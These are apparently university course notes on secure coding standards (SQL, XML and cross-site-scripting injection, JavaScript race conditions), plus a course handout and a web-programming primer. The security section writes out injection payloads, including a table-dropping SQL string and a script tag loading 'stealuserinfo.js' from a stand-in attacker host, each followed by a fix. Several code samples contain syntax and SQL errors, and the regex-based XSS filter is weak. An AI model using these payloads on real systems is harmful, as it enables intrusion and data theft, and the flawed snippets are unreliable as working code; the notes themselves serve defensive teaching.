input strings povided by external parties, normal users and malicious users. A malicious user might set un to \"\" and pw to \"' OR '0'='0\" the query becomes SELECT * FROM db_user WHERE username='' AND password='' OR '0' = '0'; which always return all the records from the db_user table. As a result, the user can login without giving a user name and password. In the worst situation, a malicious user could give the following input un = \"\" and pw = \"'; drop table db_user; --\" , the query becomes SELECT * FROM db_user WHERE username='' AND password=''; drop table db_user; --' As a result, all the records in the db_user are deleted. To prevent SQL injection attacks, a Prepared Statement should be used. function login(db, un, pw) { const [rows, fieldDefs] = await db.pool.query(` SELECT * FROM db_user WHERE username= ? AND password= ? `, [un, pw]); let found = false; if (rows.length > 0) { found = true; } return found; } In the updated version above, we use an overloaded query() to define a prepared statement. to manage the query. The ? placeholders allow the programmers to indicate where the untrusted input should be inserted after being sanitized. Via the prepared statement, we sanitize the untrusted input strings before inserting them into the statement. XML Injection Besides SQL injection, untrusted XML data fragment imposes threats to the system security too. Consider the following JavaScript program function addIPhone(qty) { const doc = `<item> <description>iPhone X</description> <price>999.0</price> <quantity>${qty}</quantity> </item>`; addToCart(doc); } when a normal user invokes the above function with qty = \"1\" , the resulting XML document <item> <description>iPhone X</description> <price>999.0</price> <quantity>1</quantity> </item> which captures the user's shopping item, will be process by addToCart() function. Suppose a malicious user invokes the function with a rigged input qty = \"1</quantity><price>1.0</price><quantity>1\" which results in the following XML document <item> <description>iPhone X</description> <price>999.0</price> <quantity>1</quantity> <price>1</price> <quantity>1</quantity> </item> If the addToCart() method processes the elements top-to-bottom in order, it might override the price value 999.0 by 1 . The fix to this issue is similar to the one for SQL injection. What is required is to santize the input string before embedding into the XML template which is used as a trusted data. IDS01-J. Normalize strings before validating them Cross Site Scripting The third example of security loop holes caused by using untrusted data in the trusted context is Cross Site Scripting. Consider the following app app.use('/', (req,res) => { let msg = dbmodel.getOne(); res.send( `<div> the message is </div> <div> ${msg} </div>` ); }) Suppose the message created by some normal user and recored in the database is \"hello\" . The above route handler returns <div> the message is </div> <div> hello </div> However the threat surfaces when the message retrieved from the database is \"<script src='http://hacker-network.io/stealuserinfo.js' type='javascript'></script> \" as the resulting html document becomes <div> the message is </div> <div> <script src='http://hacker-network.io/stealuserinfo.js' type='javascript'></script> </div> when it is executed on the victim's browser, the hacker's script will be executed and extract the information from the victim's machine. One way to address this issue is to santize the record retrieved from the database app.use('/', (req,res) => { let msg = dbmodel.getOne(); const regex = /<.*>/g; let html = \"\": if (msg.match(regex)) { html = \"<div> the message contains some illegal characters </div>\"; } else { html = `<div> the message is </div> <div> ${msg} </div>`; } res.send(html); }) However this might not cover all edge cases. Suppose the malicious user use the unicode representation of the < and > , namely and \\uFE64 and \\uFE65 . This motivates the need of normalizing the unicode representations into the ascii representation before sanization. app.use('/', (req,res) => { let msg = dbmodel.getOne(); const regex = /<.*>/g; let html = \"\": if (msg.normalize('NFKC').match(regex)) { html = \"<div> the message contains some illegal characters </div>\"; } else { html = `<div> the message is </div> <div> ${msg} </div>`; } res.send(html); }) Pseudo Racing condition in JavaScript Note that there is no multi-threading in JavaScript. JavaScript concurrency is actualized via promises and event call back. It does not make JavaScript applications free from the plague of racing conditions. For example consider the following program let a = { bal : 100 } let b = { bal : 200 } let c = { bal : 150 } function get_bal(acc) { return new Promise((resolve, reject) => { resolve(acc.bal); }) } function set_bal(acc, new_bal) { return new Promise((resolve, reject) => { acc.bal = new_bal; resolve(new_bal); }) } In the above we instantiate three objects to simulate some separates accounts. We define * a get_bal() promise builder function which returns a promise that resolves on the account's balance. * a set_bal() promise builder function which returns a promise that updates the account's balance. Next we define a transfer() function which transfer some amount from two accounts, by calling get_bal() and set_bal() async function transfer(src, dst, amt) { let src_bal = await get_bal(src); let dst_bal = await get_bal(dst); if (src_bal > amt) { await set_bal(dst, dst_bal + amt); await set_bal(src, src_bal - amt); } } Finally, we define our main function and the aftermath observation async function main() { await transfer(b, a, 100); await transfer(c, a, 50); } main().then( async function () { let bal_b = await get_bal(b); let bal_a = await get_bal(a); let bal_c = await get_bal(c); console.log(bal_a,bal_b,bal_c); } ) In the main() function, we sequentially transfer 100 from b to a then transfer 50 from c to a . We observe the closing balances as 250 100 100 . This is fine because the two transfer operations were carried out in sequence, (enforced by two await ). Suppose we change the main function as follows, async function main() { transfer(b, a, 100); await transfer(c, a, 50); } or async function main() { await Promise.all([ transfer(b, a, 100), transfer(c, a, 50) ]); } In either way, the two transfer operations are performed concurrently, i.e. the promises are now interleaved. When we observe the closing balances as 150 100 100 . A racing condition is triggered. One may argue that the above variants of main() are unusual, after some code review, we perhaps can eliminate the bugs. However, in the event that the two transfer operations are triggered from separate server events, e.g. from two different HTTP request handlers, such a racing condition is inevitable. Concurrency Control at the database level We can address such a data racing condition at the database level. In particular for many modern database system, we find transaction typically useful in managing concurrent read and update combo operations. For instance, in the echo app model file message.js we would like to define a new operation which first search for a message in the database, update it if the message exists. In the event of concurrent access, such a find-and-update operation can lead to a racing condition. We prevent the racing condition by enclosing the read and write database operations in a transaction. async function update(message, newTxt) { try { await db.pool.beginTransaction(); const [rows, fieldDefs] = await db.pool.query(` SELECT * FROM ${tableName} where time = ? AND msg = ?`, [message.time, message.msg] ); if (rows.length > 0) { await db.pool.execute(` UPDATE ${tableName} SET time = ? AND msg = ?`, [message.time, message.msg + newTxt] ); } await db.pool.commit(); } catch (error) { console.error(\"database connection failed. \" + error); } } Further reading on transactions https://mongoosejs.com/docs/transactions.html https://sequelize.org/docs/v6/other-topics/transactions/","title":"50.003 - Code Standards"},{"location":"notes/l12_2_code_std/#50003-code-standards","text":"","title":"50.003 - Code Standards"},{"location":"notes/l12_2_code_std/#learning-outcomes","text":"By the end of this unit, you should be able to 1. Apply SEI CERT Java Coding Standard to improve security level of a software system 1. Eliminate racing conditions in web application via transaction.","title":"Learning Outcomes"},{"location":"notes/l12_2_code_std/#coding-standard","text":"Coding standard is a common guideline for a group of software engineers to follows so as to 1. have a uniform structure of most of the codes 1. improve readability 1. improve referenceability 1. improve maintainability 1. minimize exploitability Example, we find * https://google.github.io/styleguide/ * https://wiki.sei.cmu.edu/confluence/display/java/SEI+CERT+Oracle+Coding+Standard+for+Java","title":"Coding Standard"},{"location":"notes/l12_2_code_std/#sei-cert-java-coding-standard","text":"Let's take SEI CERT Java Coding Standard as an example. It consists of a set of rules which are meant to provide normative requirements for code. Each rule is associated with a metrics for severity (low, medium, and high), likelihood (unlikely, probably, and likely) and remediation cost (high, medium, and low). Conformance to the rule can be determined through automated analysis (either static or dynamic), formal methods, or manual inspection techniques. For example, we find a subset of the rules as follows, Input valuation and data sanitization Object-orientation (not related for now since we focus on JavaScript). But you are strongly encouraged to read up. Locking and thread-safety (we've covered in some earlier unit in week 6.) Visibility and atomicity (not covered in this course) Although these coding standards are set for Java and our main language for the module is JavaScript, we will discuss those are applicable to both languages.","title":"SEI CERT Java Coding Standard"},{"location":"notes/l12_2_code_std/#input-validation-and-data-sanitization","text":"Many programs accept untrusted data originating from unvalidated users, network connections, and other untrusted sources and then pass the (modified or unmodified) data across a trust boundary to a different trusted domain. Such data must be sanitized. For example, we find the following rules in this category IDS00-J. Sanitize untrusted data passed across a trust boundary IDS01-J. Normalize strings before validating them IDS11-J. Eliminate non-character code points before validation","title":"Input Validation and Data Sanitization"},{"location":"notes/l12_2_code_std/#ids00-j-sanitize-untrusted-data-passed-across-a-trust-boundary","text":"The main idea is simple, given data provided by 3rd party, we should perform some sanitization to ensure the data is not malicious.","title":"IDS00-J. Sanitize untrusted data passed across a trust boundary"},{"location":"notes/l12_2_code_std/#sql-injection","text":"An example of such data is SQL injection. Suppose, we have the following code function login(db, un, pw) { const [rows, fieldDefs] = await db.pool.query(` SELECT * FROM db_user WHERE username='${un}' AND password='${pw}' `); let found = false; if (rows.length > 0) { found = true; } return found; } Function login takes a database connection object con , the username un and password pw and try to search for the user record in the db_user table. Note that un and pw are input strings povided by external parties, normal users and malicious users. A malicious user might set un to \"\" and pw to \"' OR '0'='0\" the query becomes SELECT * FROM db_user WHERE username='' AND password='' OR '0' = '0'; which always return all the records from the db_user table. As a result, the user can login without giving a user name and password. In the worst situation, a malicious user could give the following input un = \"\" and pw = \"'; drop table db_user; --\" , the query becomes SELECT * FROM db_user WHERE username='' AND password=''; drop table db_user; --' As a result, all the records in the db_user are deleted. To prevent SQL injection attacks, a Prepared Statement should be used. function login(db, un, pw) { const [rows, fieldDefs] = await db.pool.query(` SELECT * FROM db_user WHERE username= ? AND password= ? `, [un, pw]); let found = false; if (rows.length > 0) { found = true; } return found; } In the updated version above, we use an overloaded query() to define a prepared statement. to manage the query. The ? placeholders allow the programmers to indicate where the untrusted input should be inserted after being sanitized. Via the prepared statement, we sanitize the untrusted input strings before inserting them into the statement.","title":"SQL Injection"},{"location":"notes/l12_2_code_std/#xml-injection","text":"Besides SQL injection, untrusted XML data fragment imposes threats to the system security too. Consider the following JavaScript program function addIPhone(qty) { const doc = `<item> <description>iPhone X</description> <price>999.0</price> <quantity>${qty}</quantity> </item>`; addToCart(doc); } when a normal user invokes the above function with qty = \"1\" , the resulting XML document <item> <description>iPhone X</description> <price>999.0</price> <quantity>1</quantity> </item> which captures the user's shopping item, will be process by addToCart() function. Suppose a malicious user invokes the function with a rigged input qty = \"1</quantity><price>1.0</price><quantity>1\" which results in the following XML document <item> <description>iPhone X</description> <price>999.0</price> <quantity>1</quantity> <price>1</price> <quantity>1</quantity> </item> If the addToCart() method processes the elements top-to-bottom in order, it might override the price value 999.0 by 1 . The fix to this issue is similar to the one for SQL injection. What is required is to santize the input string before embedding into the XML template which is used as a trusted data.","title":"XML Injection"},{"location":"notes/l12_2_code_std/#ids01-j-normalize-strings-before-validating-them","text":"","title":"IDS01-J. Normalize strings before validating them"},{"location":"notes/l12_2_code_std/#cross-site-scripting","text":"The third example of security loop holes caused by using untrusted data in the trusted context is Cross Site Scripting. Consider the following app app.use('/', (req,res) => { let msg = dbmodel.getOne(); res.send( `<div> the message is </div> <div> ${msg} </div>` ); }) Suppose the message created by some normal user and recored in the database is \"hello\" . The above route handler returns <div> the message is </div> <div> hello </div> However the threat surfaces when the message retrieved from the database is \"<script src='http://hacker-network.io/stealuserinfo.js' type='javascript'></script> \" as the resulting html document becomes <div> the message is </div> <div> <script src='http://hacker-network.io/stealuserinfo.js' type='javascript'></script> </div> when it is executed on the victim's browser, the hacker's script will be executed and extract the information from the victim's machine. One way to address this issue is to santize the record retrieved from the database app.use('/', (req,res) => { let msg = dbmodel.getOne(); const regex = /<.*>/g; let html = \"\": if (msg.match(regex)) { html = \"<div> the message contains some illegal characters </div>\"; } else { html = `<div> the message is </div> <div> ${msg} </div>`; } res.send(html); }) However this might not cover all edge cases. Suppose the malicious user use the unicode representation of the < and > , namely and \\uFE64 and \\uFE65 . This motivates the need of normalizing the unicode representations into the ascii representation before sanization. app.use('/', (req,res) => { let msg = dbmodel.getOne(); const regex = /<.*>/g; let html = \"\": if (msg.normalize('NFKC').match(regex)) { html = \"<div> the message contains some illegal characters </div>\"; } else { html = `<div> the message is </div> <div> ${msg} </div>`; } res.send(html); })","title":"Cross Site Scripting"},{"location":"notes/l12_2_code_std/#pseudo-racing-condition-in-javascript","text":"Note that there is no multi-threading in JavaScript. JavaScript concurrency is actualized via promises and event call back. It does not make JavaScript applications free from the plague of racing conditions. For example consider the following program let a = { bal : 100 } let b = { bal : 200 } let c = { bal : 150 } function get_bal(acc) { return new Promise((resolve, reject) => { resolve(acc.bal); }) } function set_bal(acc, new_bal) { return new Promise((resolve, reject) => { acc.bal = new_bal; resolve(new_bal); }) } In the above we instantiate three objects to simulate some separates accounts. We define * a get_bal() promise builder function which returns a promise that resolves on the account's balance. * a set_bal() promise builder function which returns a promise that updates the account's balance. Next we define a transfer() function which transfer some amount from two accounts, by calling get_bal() and set_bal() async function transfer(src, dst, amt) { let src_bal = await get_bal(src); let dst_bal = await get_bal(dst); if (src_bal > amt) { await set_bal(dst, dst_bal + amt); await set_bal(src, src_bal - amt); } } Finally, we define our main function and the aftermath observation async function main() { await transfer(b, a, 100); await transfer(c, a, 50); } main().then( async function () { let bal_b = await get_bal(b); let bal_a = await get_bal(a); let bal_c = await get_bal(c); console.log(bal_a,bal_b,bal_c); } ) In the main() function, we sequentially transfer 100 from b to a then transfer 50 from c to a . We observe the closing balances as 250 100 100 . This is fine because the two transfer operations were carried out in sequence, (enforced by two await ). Suppose we change the main function as follows, async function main() { transfer(b, a, 100); await transfer(c, a, 50); } or async function main() { await Promise.all([ transfer(b, a, 100), transfer(c, a, 50) ]); } In either way, the two transfer operations are performed concurrently, i.e. the promises are now interleaved. When we observe the closing balances as 150 100 100 . A racing condition is triggered. One may argue that the above variants of main() are unusual, after some code review, we perhaps can eliminate the bugs. However, in the event that the two transfer operations are triggered from separate server events, e.g. from two different HTTP request handlers, such a racing condition is inevitable.","title":"Pseudo Racing condition in JavaScript"},{"location":"notes/l12_2_code_std/#concurrency-control-at-the-database-level","text":"We can address such a data racing condition at the database level. In particular for many modern database system, we find transaction typically useful in managing concurrent read and update combo operations. For instance, in the echo app model file message.js we would like to define a new operation which first search for a message in the database, update it if the message exists. In the event of concurrent access, such a find-and-update operation can lead to a racing condition. We prevent the racing condition by enclosing the read and write database operations in a transaction. async function update(message, newTxt) { try { await db.pool.beginTransaction(); const [rows, fieldDefs] = await db.pool.query(` SELECT * FROM ${tableName} where time = ? AND msg = ?`, [message.time, message.msg] ); if (rows.length > 0) { await db.pool.execute(` UPDATE ${tableName} SET time = ? AND msg = ?`, [message.time, message.msg + newTxt] ); } await db.pool.commit(); } catch (error) { console.error(\"database connection failed. \" + error); } }","title":"Concurrency Control at the database level"},{"location":"notes/l12_2_code_std/#further-reading-on-transactions","text":"https://mongoosejs.com/docs/transactions.html https://sequelize.org/docs/v6/other-topics/transactions/","title":"Further reading on transactions"},{"location":"notes/l1_course_handout/","text":"50.003 Elements of Software Construction Course Handout This page will be updated regularly. Sync up often. Course Description This course is an introduction to the fundamental principles and techniques of software construction that have the greatest impact on practice. Topics include capturing the essence of a problem by recognizing and inventing suitable abstractions; key paradigms, including basic concepts of software design and their expression using notations from Unified Modeling Language (UML); software testing, automated software test generation, automated software security testing via black box, greybox and whitebox fuzzing approaches, detection and removal of software code smells, software coding standards to avoid security loopholes, concurrent programming, including programming with threads and processes, understanding concurrency problems like deadlock and data race. This course includes exercises in software design, implementation, testing and reasoning. Prerequisites 50.001 Information Systems & Programming Module Learning Outcomes By the end of this module, students are able to Design medium-scale software systems from scratch: formulating and analysing the problem to be solved; writing formal software requirements, exploring and formulating system designs; and using extensive and systematic testing and reasoning to ensure quality. Apply key software engineering ideas, including invariants, decoupling, and data abstraction. Apply key software engineering ideas, including software design, specification, abstraction, verification and correctness. Apply widely used design concepts and notations (UML diagrams) and patterns in exploring and articulating problems and designs. Learning effective techniques on ensuring quality of large-scale software systems. Apply concepts of systematic software testing to discover bugs (including security vulnerabilities) in large-scale software systems. Apply concepts to reason about the security loopholes in software systems. Learning secure software coding standards. Learning key concepts in developing concurrent programs. Learning key concepts in reasoning and testing concurrent programs. Resource The main resources are lecture slides, tutorial sessions, and online documentations. There are no official textbooks. But the following are useful for reference and deeper understanding of some topics. Brian Goetz et al., Java Concurrency in Practice, 1st ed. Boston, MA: Addison-Wesley, 2006. Instructors Prof Kenny Lu (kenny_lu@sutd.edu.sg) Office Hour: Wednesday 3:00-4:30pm (please send email to arrange) Prof Fredy Tantri (fredy_tantri@sutd.edu.sg) Office Hour: Prof TC Tan TAs Communication If you have course/assignment/project related questions, please post it on the dedicated MS teams channel. Grading Your final grade is computed as follows: Cohort exercises \u2013 18% Course Feedback \u2013 2% Quizzes \u2013 10% Course Project \u2013 40% Project Meetings 1, 2, 3, 4 (each 5%) Final presentation, demo and report (20%) Final Exam \u2013 30% Things you need to prepare Git Node.js (version > 20) Visual Studio Code (or whatever IDE you prefer) Ubuntu subsystem if you are using Windows MongoDB MySQL >8 Project Please refer to the project page . Submission Policy and Plagiarism You will do the assignment/project on your own (own teams) and will not copy paste solutions from someone else. You will not post any solutions related to this course to a private/public repository that is accessible by the public/others. Students are allowed to have a private repository for their assignment which no one can access. For projects, students can only invite their partners as collaborators to a private repository. Failing to follow the Code of Honour will result in failing the course and/or being submitted to the University Disciplinary Committee. The consequences apply to both the person who shares their work and the person who copies the work. Schedule (12 May 2024 - 17 Aug 2024) Week Lecture 1 Lecture 2 Cohort Class Remarks 1 (12/5) Software Development Process and Software Design Software Development Process and Software Design Software Development Process and Software Design 2 (19/5) Software Design and UML Software Design and UML Software Design and UML Project Team Submission (26/5 23:59) 3 (26/5) Use Case Studies of Software Development Use Case Studies of Software Development Use Case Studies of Software Development Wednesday is public holiday Quiz 1:UML (3%) 4 (2/6) Basic Web App Architecture JavaScript and Node.js JavaScript and Node.js 5 (9/6) Web App Backend Architecture Web App Backend Architecture Web App Backend Architecture Submit project meeting 1 presentation video by 17/6 2359 6 (16/6) Web App Frontend Architecture Project Meeting 1 Monday is a public holiday Quiz 2: Node.js (3%) 7 (23/6) Recess Week Recess Week 8 (30/6) Web App Frontend Architecture Software Testing Web App Frontend Architecture Submit project meeting 2 presentation video by 8/7 2359 9 (7/7) Blackbox unit testing Blackbox integration / system testing Project Meeting 2 10 (14/7) UI Testing Whitebox / Path base testing Blackbox Testing Submit project meeting 3 presentation video by 22/7 2359 Quiz 3: React.js and Unit Testing (4%) 11 (21/7) Test generation: Fuzzing Test generation: Genetic algorithm, Symbolic Execution Project Meeting 3 12 (28/7) Concurrency and Concurrent Program Testing Secure Software Coding Standard, Code smells and Maintenance Project Meeting 4 13 (4/8) Final Presentation Final Presentation Final Presentation Friday is a public holiday 14 (11/8) Make Up and Alternative Assessment Make ups for Final exam will be administered when there is an official Leave of Absence from OSA. There will be only one make up. There will be no make-up if students miss the make up test.","title":"Handout"},{"location":"notes/l1_course_handout/#50003-elements-of-software-construction-course-handout","text":"","title":"50.003 Elements of Software Construction  Course Handout"},{"location":"notes/l1_course_handout/#this-page-will-be-updated-regularly-sync-up-often","text":"","title":"This page will be updated regularly. Sync up often."},{"location":"notes/l1_course_handout/#course-description","text":"This course is an introduction to the fundamental principles and techniques of software construction that have the greatest impact on practice. Topics include capturing the essence of a problem by recognizing and inventing suitable abstractions; key paradigms, including basic concepts of software design and their expression using notations from Unified Modeling Language (UML); software testing, automated software test generation, automated software security testing via black box, greybox and whitebox fuzzing approaches, detection and removal of software code smells, software coding standards to avoid security loopholes, concurrent programming, including programming with threads and processes, understanding concurrency problems like deadlock and data race. This course includes exercises in software design, implementation, testing and reasoning.","title":"Course Description"},{"location":"notes/l1_course_handout/#prerequisites","text":"50.001 Information Systems & Programming","title":"Prerequisites"},{"location":"notes/l1_course_handout/#module-learning-outcomes","text":"By the end of this module, students are able to Design medium-scale software systems from scratch: formulating and analysing the problem to be solved; writing formal software requirements, exploring and formulating system designs; and using extensive and systematic testing and reasoning to ensure quality. Apply key software engineering ideas, including invariants, decoupling, and data abstraction. Apply key software engineering ideas, including software design, specification, abstraction, verification and correctness. Apply widely used design concepts and notations (UML diagrams) and patterns in exploring and articulating problems and designs. Learning effective techniques on ensuring quality of large-scale software systems. Apply concepts of systematic software testing to discover bugs (including security vulnerabilities) in large-scale software systems. Apply concepts to reason about the security loopholes in software systems. Learning secure software coding standards. Learning key concepts in developing concurrent programs. Learning key concepts in reasoning and testing concurrent programs.","title":"Module Learning Outcomes"},{"location":"notes/l1_course_handout/#resource","text":"The main resources are lecture slides, tutorial sessions, and online documentations. There are no official textbooks. But the following are useful for reference and deeper understanding of some topics. Brian Goetz et al., Java Concurrency in Practice, 1st ed. Boston, MA: Addison-Wesley, 2006.","title":"Resource"},{"location":"notes/l1_course_handout/#instructors","text":"Prof Kenny Lu (kenny_lu@sutd.edu.sg) Office Hour: Wednesday 3:00-4:30pm (please send email to arrange) Prof Fredy Tantri (fredy_tantri@sutd.edu.sg) Office Hour: Prof TC Tan","title":"Instructors"},{"location":"notes/l1_course_handout/#tas","text":"","title":"TAs"},{"location":"notes/l1_course_handout/#communication","text":"If you have course/assignment/project related questions, please post it on the dedicated MS teams channel.","title":"Communication"},{"location":"notes/l1_course_handout/#grading","text":"Your final grade is computed as follows: Cohort exercises \u2013 18% Course Feedback \u2013 2% Quizzes \u2013 10% Course Project \u2013 40% Project Meetings 1, 2, 3, 4 (each 5%) Final presentation, demo and report (20%) Final Exam \u2013 30%","title":"Grading"},{"location":"notes/l1_course_handout/#things-you-need-to-prepare","text":"Git Node.js (version > 20) Visual Studio Code (or whatever IDE you prefer) Ubuntu subsystem if you are using Windows MongoDB MySQL >8","title":"Things you need to prepare"},{"location":"notes/l1_course_handout/#project","text":"Please refer to the project page .","title":"Project"},{"location":"notes/l1_course_handout/#submission-policy-and-plagiarism","text":"You will do the assignment/project on your own (own teams) and will not copy paste solutions from someone else. You will not post any solutions related to this course to a private/public repository that is accessible by the public/others. Students are allowed to have a private repository for their assignment which no one can access. For projects, students can only invite their partners as collaborators to a private repository. Failing to follow the Code of Honour will result in failing the course and/or being submitted to the University Disciplinary Committee. The consequences apply to both the person who shares their work and the person who copies the work.","title":"Submission Policy and Plagiarism"},{"location":"notes/l1_course_handout/#schedule-12-may-2024-17-aug-2024","text":"Week Lecture 1 Lecture 2 Cohort Class Remarks 1 (12/5) Software Development Process and Software Design Software Development Process and Software Design Software Development Process and Software Design 2 (19/5) Software Design and UML Software Design and UML Software Design and UML Project Team Submission (26/5 23:59) 3 (26/5) Use Case Studies of Software Development Use Case Studies of Software Development Use Case Studies of Software Development Wednesday is public holiday Quiz 1:UML (3%) 4 (2/6) Basic Web App Architecture JavaScript and Node.js JavaScript and Node.js 5 (9/6) Web App Backend Architecture Web App Backend Architecture Web App Backend Architecture Submit project meeting 1 presentation video by 17/6 2359 6 (16/6) Web App Frontend Architecture Project Meeting 1 Monday is a public holiday Quiz 2: Node.js (3%) 7 (23/6) Recess Week Recess Week 8 (30/6) Web App Frontend Architecture Software Testing Web App Frontend Architecture Submit project meeting 2 presentation video by 8/7 2359 9 (7/7) Blackbox unit testing Blackbox integration / system testing Project Meeting 2 10 (14/7) UI Testing Whitebox / Path base testing Blackbox Testing Submit project meeting 3 presentation video by 22/7 2359 Quiz 3: React.js and Unit Testing (4%) 11 (21/7) Test generation: Fuzzing Test generation: Genetic algorithm, Symbolic Execution Project Meeting 3 12 (28/7) Concurrency and Concurrent Program Testing Secure Software Coding Standard, Code smells and Maintenance Project Meeting 4 13 (4/8) Final Presentation Final Presentation Final Presentation Friday is a public holiday 14 (11/8)","title":"Schedule (12 May 2024 - 17 Aug 2024)"},{"location":"notes/l1_course_handout/#make-up-and-alternative-assessment","text":"Make ups for Final exam will be administered when there is an official Leave of Absence from OSA. There will be only one make up. There will be no make-up if students miss the make up test.","title":"Make Up and Alternative Assessment"},{"location":"notes/l4_1_web_prog_common_js/","text":"50.003 - Basics of Web Programming Learning Outcomes By the end of this unit, you should be able to Define an HTML document with elements and attributes. Define the cosmetic and layouts of an HTML documents using CSS. Use JavaScript to capture user inputs from HTML documents. Use JavaScript to render output to the HTML documents. Apply JavaScript operators to compute results Define customized JavaScript datatype using class Define named and anonymous functions in JavaScript Describe the semantics of Common JavaScript Basic Components of A Web Application A Web application consists of two major parts. Front-end - the user interface, is often presented with a browser on the PC or on the mobile devices. The front-end loads and presents the required data to the users. The front-end also captures the user's inputs and translates them into system actions to be performed by the web application (both frontend or backend). Back-end - the application's brain. It is often made up of the business logic layer and the data layer. The data layer takes care of the data storage, query and manipulation, while the business logic layer implements the defined actions to be perform given the user inputs (from the front-end). Common front-end software components HTML CSS JavaScript Common back-end software components A database or a set of databases A backend application server or a set of back-end application servers A set of cache storage (optional) A group of load balancers (optional) HTML Hyper Text Markup Language is a language to define the structure of a document (AKA a web page). <!DOCTYPE html> <html> <head> <meta charset=\"utf-8\"/> <title>50.003</title> </head> <body> <p class=\"heading\">Welcome to 50.003!</p> <p id=\"msg1\" class=\"message\">It's about Software Engineering!</p> </body> </html> There are many versions/standards of HTML. We only consider HTML5 in this unit. An HTML document consists of a doctype decleration, which tells the brower which version of HTML it is in. The second part is an <html> element. Each element consists of an open tag and a close tag and the children. For instance, <html> is the opening tag and </html> is the closing. The children of an elemnent can be elements or texts. However there are a set of rules governing what contents could appear in a given element. In the above example, the content of the <html> element consists of a <head> elemnt and a <body> elemnent. Element without child/content can be written in a short form, e.g. <meta charset=\"utf-8\" /> is a short hand of <meta charset=\"utf-8\"></meta> . Note that charset=\"utf-8\" denotes an attribute of this <meta> element. The HTML document in the above example defines a structure as follows, html head meta title text body paragraph text CSS Cascading Style Sheets is a language used in describing the presentation of a document. Being different from HTML, it focuses on the aesthetical requirement of the documents. For instance, it defines the answers to the following questions, Which font family should the title text be rendered in? How many pixels should the text margin be? ... and etc. p { margin:10px; } #msg1 { font-family:'Courier New', Courier, monospace; } .heading { font-size:larger; } There are three rules in the above CSS. Each rule consists two parts. 1. terms preceding the { are called the selectors. 2. terms being enclosed by { and } are called the declarations. * Each declaration consists of a property (preceding the colon : ) and a value (following the colon : ). * Declarations are terminated by a semi colon ; . For instance, in the first rule, we find p as the selector, which means that this rule is applicable to all <p> elements in the target HTML document. For all applicable elements, we want to set the margin to be 10 pixel wide. The second rule applies to a particular element with id = #msg1 . Note that ids in an HTML document must be unique. In this rule, we want to set the font family of the text contained in the applicable elements to Courier New . In the third rule, we would like to apply the declaration to all elements with class attribute equal to heading . Suppose the above css definitions are stored in a file named hello.css , we could add the following as one of the child element of the <head> element in the earlier html document. <!DOCTYPE html> <html> <head> <link rel=\"stylesheet\" href=\"hello.css\"/> ... </head> <body> ... </body> </html> Note that selectors are composable , e.g. selector p.heading selects all <p> elements with class equal to heading . For information refers to https://www.w3schools.com/cssref/css_selectors.php Overlapping CSS rules Suppose we add a new CSS rule to the earlier CSS p { margin:10px; } #msg1 { font-family:'Courier New', Courier, monospace; } .heading { font-size:larger; } // new rule p.message { margin:5px; } The first and the newly added rules are overlapping, i.e. the set of HTML elements they select are overlapping, i.e. <p id=\"msg1\" class=\"message\">It's about Software Engineering!</p> is selected by both rules. However the declarations of the two rules are not compatible. In such a situation, CSS interpretors will pick the one with higher specificity to apply the selected HTML element. For details on how specificity score is calculated, refer to the following https://www.w3.org/TR/CSS21/cascade.html#specificity JavaScript JavaScript is a programming language that was initially designed to run in the browsers. Its internal design was influenced by Lisp and Scheme, it s external syntax was strongly influence by Java, though its behavior differs from Java. In the last decade, JavaScript was extended to run directly in the backend systems as well. In this unit, we consider the version of JavaScript that run in the browsers. A Simple Example First we modify the HTML document introduced earlier to include a <script> element. Note that we can't use <script/> short-hand as it won't work in certain browsers. <!DOCTYPE html> <html> <head> <link rel=\"stylesheet\" href=\"hello.css\"/> <script src=\"hello.js\"> </script> ... </head> <body> ... </body> </html> The content of the hello.js file is as follows. console.log(\"hello\"); In the above, we define a JavaScript program that prints a string hello in the console. Note that the printed string will not appear in the HTML page, instead it is printed in the console of the browser Chrome and Edge: \"three vertical dot\" -> \"More Tools\" -> \"Developer Tools\" -> \"Console\" Firefox: \"three horizontal bars\" -> \"More Tools\" -> \"Web Developer Tools\" -> \"Console\" Alternatively, we may also use online learning tools such as https://jsfiddle.net/ To display \"hello\" message in a pop-up window, we could change the console.log() method with alert() . var msg = \"hello\"; // console.log(msg); alert(msg); In the above, we have 3 lines code JS codes. In the first statement we define a variable msg with value \"hello\" . In JavaScript var keyword in define a variable. The second statement the console.log() that we used previously and it is commented away. The third statement is a method call to alert() with msg as the actual argument. Lastly, if we want to add a string to the begining of the HTML document, we may use document.write() method. var msg = \"hello\"; /* console.log(msg); alert(msg); */ document.write(msg); In the above we use /* ... */ to comment multiple lines. document is a predefined variable holding the reference of the current HTML document. document.write() takes a string and inserts it to the begining of the document. Note that the semi-colon at the end of each statment is optional. Input/Output One may ask, \"what about displaying the message inside some of the HTML element?\" First attempt Suppose we change the Javascript program as follows var msg = \"hello\"; var p_elem = document.getElementById(\"msg1\"); p_elem.innerText = msg; In the second statement, we call document.getElementById() to retrieve the reference to the element with id= msg1 in the HTML document and store the reference in a variable p_elem . In the third statement, we set the inner HTML of this element as msg . Howe when we load the HTML with the above script, some error occured. Uncaught TypeError: p_elem is null. This is because we retrieve the element reference before the document is fully rendered hence p_elem is having a null reference. Second attempt To fix this problem, we need to postpone the JavaScript execution until =the doucment is fully rendered. There are two possible ways to do that. 1. Write a busy loop to keep checking whether the document is fully rendered. 2. Enclose the action (of updating the content of the <p id=\"msg1\"> element) in a function. Make this function into a call-back, which will only be invoked when the document is done with rendered. To keep the resource usage low, JavaScript adopts the 2nd idea. var msg = \"hello\"; function run() { var p_elem = document.getElementById(\"msg1\"); p_elem.innerText = msg; } document.addEventListener( \"DOMContentLoaded\", run); In the above, we define a function named run with no argument. The body of the function contains the action to be performed when the document is fully rendered. In the last statement, we register the run() function as the call-back of the event \"DOMContentLoaded\" of the document object. The function run() is able to access the variable msg defined outside. In JavaScript this is called closure . Capturing the user input Now let's add a textbox in the HTML document and capture the user's input in this textbox via a button click. Consider textandbutton.html as follows, <!DOCTYPE html> <html> <head> <script src=\"textandbutton.js\"> </script> <meta charset=\"utf-8\"/> <title>50.003 sample code: Text and Button</title> </head> <body> <div>Your input: <input id=\"textbox1\" type=\"text\" /> </div> <div>Output: <span id=\"span1\"></span></div> <div><button id=\"button1\">Submit</button></div> </body> </html> In the above HTML document, we find three components in the body, an <input> , a <span> as output field and a <button> . In the textandbutton.js we have the following definitions. function handleButton1Click() { var textbox1 = document.getElementById(\"textbox1\"); var span1 = document.getElementById(\"span1\"); span1.innerHTML = textbox1.value; } function run() { var button1 = document.getElementById(\"button1\"); button1.addEventListener(\"click\", handleButton1Click); } document.addEventListener( \"DOMContentLoaded\", run); Basic Data Structures String String in 